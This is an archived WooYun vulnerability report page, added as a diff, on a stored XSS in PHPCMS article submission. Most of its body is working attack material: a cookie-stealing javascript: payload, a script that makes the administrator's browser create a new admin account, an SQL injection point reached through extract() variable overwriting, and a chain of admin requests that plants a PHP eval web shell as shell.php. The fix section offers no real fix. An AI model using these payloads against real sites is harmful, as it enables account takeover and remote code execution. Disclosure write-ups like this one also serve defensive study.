@@ -1,0 +1,342 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPCMS最新版存储型xss（附多种利用方法）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPCMS最新版存储型xss（附多种利用方法）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2013-12-18 12:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-21：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-07：	细节向普通白帽子公开<br/>
+									2014-01-27：	细节向实习白帽子公开<br/>
+									2014-03-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我想说的是难道还有什么比让人帮忙做事,自己翘着二郎腿 坐等结果更爽的事吗?哼哼哼...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">PHPCMS文章投稿处存在存储型的XSS漏洞,也许当你看到标题的时候,你心里会想：楼主简直太不厚道了,不就一个XSS嘛,标题却来个代码执行...别慌,一个漏洞所造成的威胁,本人觉得并不在于其本身,而在于我们如何将其利用,使之最大化, So...听我细细道来...<br />
+<br />
+<br />
+<br />
+#1 首先说下这个漏洞的产生<br />
+<br />
+/phpcms/modules/member/content.php 61行左右<br />
+<br />
+</p><pre><code>&lt;?<br />
+$info = array();<br />
+foreach($_POST[&#039;info&#039;] as $_k=&gt;$_v){<br />
+	if(in_array($_k, $fields)) $info[$_k] = new_html_special_chars(trim_script($_v));<br />
+}<br />
+$_POST[&#039;linkurl&#039;] = str_replace(array(&#039;&quot;&#039;,&#039;(&#039;,&#039;)&#039;,&quot;,&quot;,&#039; &#039;),&#039;&#039;,new_html_special_chars($_POST[&#039;linkurl&#039;]));<br />
+//exit($_POST[&#039;linkurl&#039;]);//上面一行仅简单过滤了&quot;、(、)等,SO可以轻松绕过<br />
+$post_fields = array_keys($_POST[&#039;info&#039;]);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+对应的前台：<br />
+<br />
+</p><p class="detail"><a href="../images/1810223491a32cd34b9bcb4a6e0637ca77ad2350.jpg" target="_blank"><img src="../images/1810223491a32cd34b9bcb4a6e0637ca77ad2350.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#2 简单利用之一获取管理员COOKIE<br />
+<br />
+投稿一篇 写入利用代码：<br />
+<br />
+</p><pre><code>Javascript:%28alert%28document.cookie%29%29</code></pre><p class='detail'><br />
+<br />
+前台效果展示：<br />
+<br />
+</p><p class="detail"><a href="../images/181028394dbe10992d40a760fb46b13ca2694436.jpg" target="_blank"><img src="../images/181028394dbe10992d40a760fb46b13ca2694436.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+管理后台效果展示：<br />
+<br />
+</p><p class="detail"><a href="../images/1810295786eca199d991eb1d3cf2aaaffb73c21d.jpg" target="_blank"><img src="../images/1810295786eca199d991eb1d3cf2aaaffb73c21d.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#3 简单利用之二添加任意管理员账号<br />
+<br />
+这个我具体没去测试,不过应该可行，给出利用代码(js)：<br />
+<br />
+将下面的代码保存为js：<br />
+<br />
+</p><pre><code>if(top.window.location.href.indexOf(&quot;pc_hash=&quot;)&gt;0){<br />
+   var hash = top.window.location.href.substr(top.window.location.href.indexOf(&quot;pc_hash=&quot;)+8,6);<br />
+ }<br />
+ var xmlHttp = null;<br />
+ var cookie = document.cookie;<br />
+ var url = &quot;index.php?m=admin&amp;c=admin_manage&amp;a=add&quot;;<br />
+ var urldata = &quot;info%5Busername%5D=test&amp;info%5Bpassword%5D=123456&amp;info%5Bpwdconfirm%5D=123456&amp;info%5Bemail%5D=felixk3y%40qq.com&amp;info%5Brealname%5D=aaa&amp;info%5Broleid%5D=1&amp;dosubmit=%E6%8F%90%E4%BA%A4&amp;pc_hash=&quot;+hash;<br />
+<br />
+if(window.ActiveXObject){ <br />
+    xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+}<br />
+else if(window.XMLHttpRequest){ <br />
+    xmlHttp=new XMLHttpRequest();<br />
+} <br />
+if(xmlHttp!=null){<br />
+    xmlHttp.onreadystatechange=state_Change;<br />
+    xmlHttp.open(&quot;POST&quot;,url,false);<br />
+    xmlHttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;);<br />
+    xmlHttp.setRequestHeader(&quot;Cookie&quot;,cookie);<br />
+    xmlHttp.send(urldata);//不为null时,必须设置Content-Type<br />
+}<br />
+function state_Change()<br />
+{<br />
+  if(xmlHttp.readyState==4)<br />
+  {<br />
+      if (xmlHttp.status==200) <br />
+      {<br />
+         //alert(xmlHttp.responseText);<br />
+      }<br />
+   }<br />
+}</code></pre><p class='detail'><br />
+<br />
+#4 深入利用利用之SQL注入<br />
+<br />
+话说XSS的危害没有SQL注入严重，好吧 我承认.但是由于PHPCMS的后台变量覆盖满天飞,利用变量覆盖造成的SQL注入不是一处两处,利用XSS,我们同样可以让管理员帮我们进行注入,下面随便挑一处进行说明：<br />
+<br />
+/phpcms/modules/admin/log.php 第51行左右<br />
+<br />
+&lt;?<br />
+<br />
+//...<br />
+<br />
+public function search_log() {<br />
+<br />
+ 	$where = &#039;&#039;;<br />
+<br />
+	extract($_GET[&#039;search&#039;]); //extract导致变量覆盖,覆盖下面的$where可进行注入<br />
+<br />
+	if($username){<br />
+<br />
+		$where .= $where ?  &quot; AND username=&#039;$username&#039;&quot; : &quot; username=&#039;$username&#039;&quot;;<br />
+<br />
+	}<br />
+<br />
+	if($module){<br />
+<br />
+		$where .= $where ?  &quot; AND module=&#039;$module&#039;&quot; : &quot; module=&#039;$module&#039;&quot;;<br />
+<br />
+	}<br />
+<br />
+	if($start_time &amp;&amp; $end_time) {<br />
+<br />
+		$start = $start_time;<br />
+<br />
+		$end = $end_time;<br />
+<br />
+		$where .= &quot;AND `time` &gt;= &#039;$start&#039; AND `time` &lt;= &#039;$end&#039; &quot;;<br />
+<br />
+//...<br />
+<br />
+?&gt;<br />
+<br />
+至于具体利用嘛,可通过js的XMLHttpRequest ,具体就不多说了,都懂的...<br />
+<br />
+#5 深入利用之任意代码执行,GETSHELL<br />
+<br />
+在XSS处插入Getshell的JavaScript代码,js大至代码如下(js不熟悉,只能写个大概,别见笑)：<br />
+<br />
+详细的过程可以参考：http://bbs.blackbap.org/thread-4568-1-1.html<br />
+<br />
+这里只是通过XMLHttpRequest去实现罢了,So...<br />
+<br />
+获取pc_hash:<br />
+<br />
+</p><pre><code>if(top.window.location.href.indexOf(&quot;pc_hash&quot;)&gt;0){<br />
+	var hash = top.window.location.href.substr(top.window.location.href.indexOf(&quot;pc_hash=&quot;)+8,6);<br />
+ }</code></pre><p class='detail'><br />
+<br />
+xmlhttp 第一步：<br />
+<br />
+POST /phpcms/index.php?m=admin&amp;c=urlrule&amp;a=add<br />
+<br />
+post参数：<br />
+<br />
+</p><pre><code>dosubmit=+%CC%E1%BD%BB+&amp;pc_hash=Wq87o4&amp;info%5Bfile%5D=category&amp;info%5Bmodule%5D=content&amp;info%5Bishtml%5D=1&amp;info%5Bexample%5D=shell&amp;info%5Burlrule%5D=shell.php&amp;f1=%7B%24categorydir%7D&amp;f1=%7B%24catdir%7D&amp;f1=%7B%24year%7D&amp;f1=%7B%24month%7D&amp;f1=%7B%24day%7D&amp;f1=%7B%24id%7D&amp;f1=%7B%24page%7D</code></pre><p class='detail'><br />
+<br />
+xmlhttp 第二步：<br />
+<br />
+POST /phpcms/index.php?m=admin&amp;c=category&amp;a=add<br />
+<br />
+post参数：<br />
+<br />
+</p><pre><code>addtype=0&amp;info%5Bmodelid%5D=1&amp;info%5Bparentid%5D=0&amp;info%5Bcatname%5D=%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3F%3E&amp;batch_add=&amp;info%5Bcatdir%5D=shell&amp;info%5Bimage%5D=&amp;info%5Bdescription%5D=&amp;setting%5Bworkflowid%5D=&amp;info%5Bismenu%5D=1&amp;setting%5Bishtml%5D=1&amp;setting%5Bcontent_ishtml%5D=0&amp;category_php_ruleid=6&amp;category_html_ruleid=33&amp;show_php_ruleid=16&amp;show_html_ruleid=11&amp;setting%5Bcreate_to_html_root%5D=0&amp;info%5Burl%5D=&amp;setting%5Btemplate_list%5D=default&amp;setting%5Bcategory_template%5D=category&amp;setting%5Blist_template%5D=list&amp;setting%5Bshow_template%5D=show&amp;setting%5Bmeta_title%5D=&amp;setting%5Bmeta_keywords%5D=&amp;setting%5Bmeta_description%5D=&amp;setting%5Bpresentpoint%5D=1&amp;setting%5Bdefaultchargepoint%5D=0&amp;setting%5Bpaytype%5D=0&amp;setting%5Brepeatchargedays%5D=1&amp;catid=&amp;dosubmit=%CC%E1%BD%BB&amp;pc_hash=Wq87o4</code></pre><p class='detail'><br />
+<br />
+xmlhttp 第三步：<br />
+<br />
+POST /phpcms/index.php?m=content&amp;c=create_html&amp;a=category<br />
+<br />
+post参数：<br />
+<br />
+pc_hash=Wq87o4&amp;dosubmit=1&amp;type=all&amp;modelid=&amp;catids%5B%5D=0&amp;pagesize=10<br />
+<br />
+<br />
+<br />
+下面给出个xmlhttp发送post包大致代码如下：<br />
+<br />
+</p><pre><code>var postdata = &quot;postdata&quot;<br />
+xmlhttp.open(&quot;POST&quot;, url, true); <br />
+xmlhttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);<br />
+xmlhttp.setRequestHeader(&quot;Content-length&quot;, postdata.length);<br />
+xmlhttp.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);<br />
+xmlhttp.send(paramss);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+此时会在html文件夹下生成shell.php，不过此时&quot;&lt;&quot;会被转义。<br />
+<br />
+</p><p class="detail"><a href="../images/181101586d789a6020c624a28c61f56096baa960.jpg" target="_blank"><img src="../images/181101586d789a6020c624a28c61f56096baa960.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这时候，重复2 3步骤,即可getshell ,执行任意代码<br />
+<br />
+SHELL Link: http://url/html/shell.php<br />
+<br />
+</p><p class="detail"><a href="../images/181106121f3ca39245f13ca3ed89902e8c1314e3.jpg" target="_blank"><img src="../images/181106121f3ca39245f13ca3ed89902e8c1314e3.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们比我懂... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046325" title="PHPCMS最新版存储型xss（附多种利用方法）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-18 17:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈！！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46325";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
